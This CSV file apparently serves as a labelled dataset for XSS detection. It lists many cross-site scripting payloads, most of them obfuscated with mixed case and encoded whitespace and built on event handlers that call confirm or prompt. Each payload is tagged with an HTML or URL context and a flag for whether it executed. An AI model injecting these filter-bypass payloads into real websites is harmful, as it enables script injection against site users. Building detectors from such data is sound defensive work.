payload,context,exec,combined
"<A%0aoNMoUsEoVER%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <A%0aoNMoUsEoVER%09=%09a=prompt,a()%0dx>v3dm0s"
<a%0dOnMoUSeoVer%09=%09confirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0dOnMoUSeoVer%09=%09confirm()%0dx>v3dm0s
<DeTaILS%0dONpoIntERenter%09=%09(prompt)``%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DeTaILS%0dONpoIntERenter%09=%09(prompt)``%0dx>
<A%0aOnMOUSeOver%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aOnMOUSeOver%09=%09(confirm)()%0dx>v3dm0s
<A/+/OnMOuseOvEr%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A/+/OnMOuseOvEr%0d=%0d[8].find(confirm)>v3dm0s
<HTml/+/ONmOUseovER%0d=%0dconfirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTml/+/ONmOUseovER%0d=%0dconfirm()//
<a%0doNpoinTERenteR%0d=%0dconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0doNpoinTERenteR%0d=%0dconfirm()>v3dm0s
<Html/+/OnPOINTERENtER+=+confirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <Html/+/OnPOINTERENtER+=+confirm()%0dx>
"<dEtAils%09oNpOinTEreNtER%0a=%0aa=prompt,a()//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <dEtAils%09oNpOinTEreNtER%0a=%0aa=prompt,a()//"
<dETaiLs/+/OnpoInTeRenTEr%09=%09(prompt)``%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dETaiLs/+/OnpoInTeRenTEr%09=%09(prompt)``%0dx>
<D3v%09onPOintereNtER%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%09onPOintereNtER%0d=%0dconfirm()%0dx>v3dm0s
<a%09ONPointERentER%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%09ONPointERentER%0d=%0d[8].find(confirm)%0dx>v3dm0s
<deTAIlS%09oNTogGlE+=+confirm()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <deTAIlS%09oNTogGlE+=+confirm()//
<a/+/ONpointereNTer+=+(prompt)``>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <a/+/ONpointereNTer+=+(prompt)``>v3dm0s
<DETAIls%0donPOintErENteR%09=%09[8].find(confirm)//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DETAIls%0donPOintErENteR%09=%09[8].find(confirm)//
<d3v%0aonMOuseOVeR%0d=%0d(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%0aonMOuseOVeR%0d=%0d(confirm)()>v3dm0s
<D3V/+/onpOINteRenter%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V/+/onpOINteRenter%09=%09[8].find(confirm)>v3dm0s
<D3V%0aoNmoUSEOveR%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0aoNmoUSEOveR%09=%09[8].find(confirm)%0dx>v3dm0s
<d3V/+/oNPOiNtERenTeR%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V/+/oNPOiNtERenTeR%0d=%0d(confirm)()%0dx>v3dm0s
<A%0aoNmouseoVeR%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aoNmouseoVeR%0a=%0a(prompt)``%0dx>v3dm0s
<a%0aoNPoiNteREnter%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aoNPoiNteREnter%0a=%0a[8].find(confirm)>v3dm0s
<A%0aONmoUSEOVER%09=%09(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aONmoUSEOVER%09=%09(confirm)()>v3dm0s
<D3V%0aONpOInTEREnTeR%0d=%0d(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0aONpOInTEREnTeR%0d=%0d(confirm)()>v3dm0s
<D3V%0aonmOuseOVeR%09=%09confirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0aonmOuseOVeR%09=%09confirm()%0dx>v3dm0s
<D3v%09OnmOUSeOvEr%0d=%0dconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%09OnmOUSeOvEr%0d=%0dconfirm()>v3dm0s
<a%0aoNMousEoveR%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aoNMousEoveR%0d=%0d[8].find(confirm)%0dx>v3dm0s
(1+1),html_text,0,CTX_html_text CTX_html_text CTX_html_text (1+1)
<d3V%0dONpOINteRENTEr+=+confirm()%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0dONpOINteRENTEr+=+confirm()%0dx>v3dm0s
<a%0aonpoInTerEntER%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aonpoInTerEntER%0a=%0a(prompt)``%0dx>v3dm0s
<D3V%09OnPoINTEREnteR%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%09OnPoINTEREnteR%09=%09(confirm)()%0dx>v3dm0s
<d3v/+/ONPoINTereNTer%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v/+/ONPoINTereNTer%09=%09[8].find(confirm)%0dx>v3dm0s
<HtmL/+/ONMOusEOVer%0a=%0a[8].find(confirm)%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HtmL/+/ONMOusEOVer%0a=%0a[8].find(confirm)%0dx>
<A%0aoNmouseOvER%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aoNmouseOvER%09=%09[8].find(confirm)>v3dm0s
"<d3V/+/onmOUsEoVer%0a=%0aa=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <d3V/+/onmOUsEoVer%0a=%0aa=prompt,a()>v3dm0s"
<HtmL%09onpOIntEreNteR%09=%09(confirm)()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HtmL%09onpOIntEreNteR%09=%09(confirm)()//
<D3V%0donmoUSeovEr%0d=%0d(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0donmoUSeovEr%0d=%0d(prompt)``>v3dm0s
<a%0dONpoinTEreNtER%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0dONpoinTEreNtER%0a=%0a(prompt)``%0dx>v3dm0s
<Html%0dOnpoinTEReNtER%09=%09[8].find(confirm)%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <Html%0dOnpoinTEReNtER%09=%09[8].find(confirm)%0dx//
<DEtAilS%0dONToGgLE+=+(confirm)()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DEtAilS%0dONToGgLE+=+(confirm)()%0dx//
<D3v/+/OnpoINteRenTer%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v/+/OnpoINteRenTer%09=%09(confirm)()%0dx>v3dm0s
"<D3v%0aOnMoUSEOver%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aOnMoUSEOver%0a=%0aa=prompt,a()%0dx>v3dm0s"
<DetAiLs%0doNtoGGle%0d=%0d[8].find(confirm)>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DetAiLs%0doNtoGGle%0d=%0d[8].find(confirm)>
<d3V/+/OnpointerEnTer%0d=%0d(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V/+/OnpointerEnTer%0d=%0d(confirm)()>v3dm0s
<DETaILs/+/ONtoGGLE%09=%09(prompt)``%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DETaILs/+/ONtoGGLE%09=%09(prompt)``%0dx>
<d3V/+/oNpOiNTereNTeR+=+confirm()>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <d3V/+/oNpOiNTereNTeR+=+confirm()>v3dm0s
<a%09ONmoUSeOVEr%0d=%0d(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%09ONmoUSeOVEr%0d=%0d(confirm)()>v3dm0s
<ScRiPt>alert(1)</ScRiPt>,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <ScRiPt>alert(1)</ScRiPt>
<D3v%0aoNmoUsEovER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aoNmoUsEovER%0d=%0dconfirm()%0dx>v3dm0s
<d3V/+/oNPoINTerEntER+=+(prompt)``>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <d3V/+/oNPoINTerEntER+=+(prompt)``>v3dm0s
<a%0dONPOINTErentER%09=%09(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0dONPOINTErentER%09=%09(confirm)()>v3dm0s
<a%09oNmouSeoVEr%0a=%0a(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09oNmouSeoVEr%0a=%0a(prompt)``>v3dm0s
<D3V%09oNpoINteREnter%0a=%0aconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%09oNpoINteREnter%0a=%0aconfirm()>v3dm0s
<Html/+/OnpoINterENTEr%0d=%0dconfirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <Html/+/OnpoINterENTEr%0d=%0dconfirm()%0dx//
alert(1),html_text,0,CTX_html_text CTX_html_text CTX_html_text alert(1)
<htML%0dOnMOuSEovER%0a=%0a(confirm)()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <htML%0dOnMOuSEovER%0a=%0a(confirm)()>
<HTmL%09ONpoinTerentEr+=+confirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTmL%09ONpoinTerentEr+=+confirm()>
<HtML%09OnmouseovER%09=%09(confirm)()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtML%09OnmouseovER%09=%09(confirm)()>
"<htML%0aONpOIntereNtER%0d=%0da=prompt,a()//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <htML%0aONpOIntereNtER%0d=%0da=prompt,a()//"
<D3v%0dOnpOINterEnTEr%09=%09[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%0dOnpOINterEnTEr%09=%09[8].find(confirm)>v3dm0s
"<HtML/+/oNmoUseoVeR%09=%09a=prompt,a()>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <HtML/+/oNmoUseoVeR%09=%09a=prompt,a()>"
<deTaIlS%0aOnpoINTereNteR%09=%09[8].find(confirm)%0dx>,html_attribute,0,CTX_html_attribute CTX_html_attribute CTX_html_attribute <deTaIlS%0aOnpoINTereNteR%09=%09[8].find(confirm)%0dx>
<a/+/OnpoiNtErEntEr+=+[8].find(confirm)>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <a/+/OnpoiNtErEntEr+=+[8].find(confirm)>v3dm0s
<DETaILs/+/oNpOinTeREntEr%09=%09confirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DETaILs/+/oNpOinTeREntEr%09=%09confirm()%0dx//
<d3v/+/ONmOUSeOVeR%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v/+/ONmOUSeOVeR%0a=%0a(prompt)``%0dx>v3dm0s
<dETAILS%0dontOGGLe%09=%09[8].find(confirm)%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETAILS%0dontOGGLe%09=%09[8].find(confirm)%0dx>
<A%0aONmoUSEOVER%09=%09(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aONmoUSEOVER%09=%09(confirm)()>v3dm0s
"<dEtAiLS%0dOnPoiNTerentER+=+a=prompt,a()//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <dEtAiLS%0dOnPoiNTerentER+=+a=prompt,a()//"
"<DETaILS%0aOnpointERenTeR%09=%09a=prompt,a()//",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <DETaILS%0aOnpointERenTeR%09=%09a=prompt,a()//"
<HTML%09ONMoUSEOVEr+=+[8].find(confirm)>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTML%09ONMoUSEOVEr+=+[8].find(confirm)>
<D3v%0aoNPOInTERenTeR%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aoNPOInTERenTeR%09=%09confirm()>v3dm0s
<d3v%0dOnPOINtErenTEr%0d=%0dconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0dOnPOINtErenTEr%0d=%0dconfirm()>v3dm0s
<detAiLS%0doNPoinTeReNtER%0d=%0d(confirm)()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <detAiLS%0doNPoinTeReNtER%0d=%0d(confirm)()%0dx//
<hTMl%0aoNpointeREnter+=+[8].find(confirm)//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTMl%0aoNpointeREnter+=+[8].find(confirm)//
<A/+/ONmOUseOVEr%0a=%0a(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A/+/ONmOUseOVEr%0a=%0a(prompt)``>v3dm0s
<D3V/+/OnmoUSeoVer%09=%09(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V/+/OnmoUSeoVer%09=%09(confirm)()>v3dm0s
"<a href=""javascript:"">",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <a href=""javascript:"">"
<A%0aONmOUSEOvEr%0d=%0d(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aONmOUSEOvEr%0d=%0d(prompt)``>v3dm0s
"<A%0aONPoINTeRENTeR%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <A%0aONPoINTeRENTeR%0d=%0da=prompt,a()>v3dm0s"
<d3v%09OnmoUseoVer%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%09OnmoUseoVer%0d=%0dconfirm()%0dx>v3dm0s
<A%0aONmOuseOvEr%0d=%0d(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aONmOuseOvEr%0d=%0d(prompt)``>v3dm0s
<D3V/+/ONpOiNterentER%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V/+/ONpOiNterentER%09=%09confirm()>v3dm0s
"<a%0aOnpoiNtERENTER%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <a%0aOnpoiNtERENTER%09=%09a=prompt,a()%0dx>v3dm0s"
<html%0aonpoInTERENtEr%0a=%0aconfirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <html%0aonpoInTERENtEr%0a=%0aconfirm()%0dx>
<hTmL/+/ONpoINTeRENTEr+=+(confirm)()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTmL/+/ONpoINTeRENTEr+=+(confirm)()%0dx>
<d3v%0aonpOiNTErenTeR%0a=%0aconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%0aonpOiNTErenTeR%0a=%0aconfirm()>v3dm0s
<htMl%0aOnpOiNTerENTeR%0a=%0a(confirm)()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htMl%0aOnpOiNTerENTeR%0a=%0a(confirm)()%0dx>
<D3V%0donMOuSeOver%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0donMOuSeOver%0d=%0d[8].find(confirm)>v3dm0s
<a/+/oNMousEoVeR%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/oNMousEoVeR%09=%09(prompt)``%0dx>v3dm0s
"<Html%09ONmousEoVEr+=+a=prompt,a()>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <Html%09ONmousEoVEr+=+a=prompt,a()>"
<a%0aoNPOiNTERENTeR%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aoNPOiNTERENTeR%09=%09[8].find(confirm)%0dx>v3dm0s
<A/+/oNMOuseoVeR%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/oNMOuseoVeR%0a=%0a(prompt)``%0dx>v3dm0s
"data:text/html,<script>confirm(1)</script>",url_navigation,1,"CTX_url_navigation CTX_url_navigation CTX_url_navigation data:text/html,<script>confirm(1)</script>"
"<html%0donpOINteReNTEr%09=%09a=prompt,a()//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <html%0donpOINteReNTEr%09=%09a=prompt,a()//"
<a/+/oNPOINtEReNtEr%0d=%0d(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/oNPOINtEReNtEr%0d=%0d(confirm)()>v3dm0s
<D3v%0aOnPOinterentER%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aOnPOinterentER%09=%09[8].find(confirm)%0dx>v3dm0s
<a/+/OnpoinTerENTeR%0d=%0dconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/OnpoinTerENTeR%0d=%0dconfirm()>v3dm0s
"<d3V%0doNmousEOVEr%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <d3V%0doNmousEOVEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
<dETaILs%0dOnToggLE%09=%09(confirm)()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dETaILs%0dOnToggLE%09=%09(confirm)()//
<A%09ONMOuSeOVeR%09=%09(confirm)()>v3dm0s,html_attribute,0,CTX_html_attribute CTX_html_attribute CTX_html_attribute <A%09ONMOuSeOVeR%09=%09(confirm)()>v3dm0s
<D3V/+/oNMoUsEOveR%0d=%0d(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V/+/oNMoUsEOveR%0d=%0d(prompt)``>v3dm0s
<detAILS%09oNpOinTerenTER%0d=%0d[8].find(confirm)//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <detAILS%09oNpOinTerenTER%0d=%0d[8].find(confirm)//
<a%0aOnpOinTerEntEr%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aOnpOinTerEntEr%0a=%0aconfirm()%0dx>v3dm0s
<A%0doNPoiNtereNTer+=+confirm()%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <A%0doNPoiNtereNTer+=+confirm()%0dx>v3dm0s
<d3V%0dOnpOINterENTer%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0dOnpOINterENTer%0d=%0d[8].find(confirm)>v3dm0s
<A%09onmOUSEoVer+=+confirm()>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <A%09onmOUSEoVer+=+confirm()>v3dm0s
<D3v%09ONmOUseoveR%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%09ONmOUseoveR%0d=%0d(prompt)``%0dx>v3dm0s
<D3v/+/OnPoINtEreNtEr%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v/+/OnPoINtEreNtEr%0d=%0d[8].find(confirm)>v3dm0s
<DEtaIlS%0aontoggle+=+confirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DEtaIlS%0aontoggle+=+confirm()>
<DETails%0dOntogGle%09=%09(confirm)()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DETails%0dOntogGle%09=%09(confirm)()>
<d3V%09OnpOiNTeRenTER%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%09OnpOiNTeRenTER%0a=%0a(prompt)``%0dx>v3dm0s
<hTMl%09oNmOuseovER%09=%09confirm()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTMl%09oNmOuseovER%09=%09confirm()//
<d3v%0doNPoiNTeREnTER%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0doNPoiNTeREnTER%0a=%0a[8].find(confirm)%0dx>v3dm0s
<D3V/+/oNMouseOvER%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V/+/oNMouseOvER%09=%09confirm()>v3dm0s
<a%09OnMoUSEoVeR%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%09OnMoUSEoVeR%09=%09(confirm)()%0dx>v3dm0s
<deTAILS%0dOnPoiNtEReNTEr%0d=%0d(confirm)()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <deTAILS%0dOnPoiNtEReNTEr%0d=%0d(confirm)()%0dx>
"<A%09OnpOINTeReNTER%0a=%0aa=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <A%09OnpOINTeReNTER%0a=%0aa=prompt,a()>v3dm0s"
<a/+/ONMOUsEovER%09=%09(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/ONMOUsEovER%09=%09(confirm)()>v3dm0s
<A%09ONMOuSeOVeR%09=%09(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%09ONMOuSeOVeR%09=%09(confirm)()>v3dm0s
<hTmL%09OnMOuSeoVeR+=+(confirm)()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTmL%09OnMOuSeoVeR+=+(confirm)()%0dx>
<HtML%0aoNMOUSeoVEr%0a=%0aconfirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtML%0aoNMOUSeoVEr%0a=%0aconfirm()%0dx>
<A%09onMOUsEOver+=+(prompt)``%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <A%09onMOUsEOver+=+(prompt)``%0dx>v3dm0s
"<DetAILS%09oNtOgglE%09=%09a=prompt,a()%0dx>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <DetAILS%09oNtOgglE%09=%09a=prompt,a()%0dx>"
<D3v%0donMoUSeOVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%0donMoUSeOVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s
<a/+/OnPoiNterENTeR%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/OnPoiNterENTeR%09=%09confirm()>v3dm0s
<A%09onpointEREnTer%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%09onpointEREnTer%0d=%0dconfirm()%0dx>v3dm0s
<d3V%0donpOINteRenteR%09=%09confirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0donpOINteRenteR%09=%09confirm()%0dx>v3dm0s
<DeTaIls/+/oNpointEREntEr%09=%09confirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DeTaIls/+/oNpointEREntEr%09=%09confirm()>
<D3V%0aoNmoUSEOveR%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0aoNmoUSEOveR%09=%09[8].find(confirm)%0dx>v3dm0s
<DeTaIls%0doNpoINTEREnTEr+=+confirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DeTaIls%0doNpoINTEREnTEr+=+confirm()%0dx//
<D3v%0aOnpOInterEnTer%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%0aOnpOInterEnTer%09=%09(confirm)()%0dx>v3dm0s
<dEtaIls%09onTOGGLE%09=%09(confirm)()%0dx//,url_href,0,CTX_url_href CTX_url_href CTX_url_href <dEtaIls%09onTOGGLE%09=%09(confirm)()%0dx//
<Details%0aoNtoggLe+=+confirm()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <Details%0aoNtoggLe+=+confirm()//
<A%0dONMouSeOVer%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0dONMouSeOVer%0a=%0a[8].find(confirm)>v3dm0s
<a%09onpOintErEnTEr%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09onpOintErEnTEr%0a=%0aconfirm()%0dx>v3dm0s
"<dEtAIls%0doNPoiNteRenTEr+=+a=prompt,a()>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <dEtAIls%0doNPoiNteRenTEr+=+a=prompt,a()>"
<D3V%0dONmOUseoVer+=+(confirm)()>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0dONmOUseoVer+=+(confirm)()>v3dm0s
"<html%0aONpOiNtErentEr%0a=%0aa=prompt,a()>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <html%0aONpOiNtErentEr%0a=%0aa=prompt,a()>"
"<D3v%0doNpoINTerENteR%09=%09a=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0doNpoINTerENteR%09=%09a=prompt,a()>v3dm0s"
<a%09onPOInTerEnteR%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09onPOInTerEnteR%09=%09(prompt)``%0dx>v3dm0s
"<d3v%0donpOinteRENtER%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <d3v%0donpOinteRENtER%09=%09a=prompt,a()%0dx>v3dm0s"
